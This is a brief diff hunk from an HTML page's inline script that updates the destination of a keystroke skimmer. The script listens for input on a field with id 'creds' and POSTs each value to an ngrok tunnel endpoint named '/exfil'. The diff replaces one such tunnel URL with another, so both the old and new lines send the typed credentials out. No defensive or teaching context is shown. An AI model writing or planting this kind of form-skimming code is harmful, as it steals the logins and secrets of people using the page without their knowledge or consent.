@@ -30,7 +30,7 @@
   <script>
     const field = document.getElementById("creds");
     field.oninput = function () {
-      fetch(" https://e003acfa7304.ngrok-free.app/exfil", {
+      fetch("https://eaf2560d9a9b.ngrok-free.app/exfil", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ value: field.value })
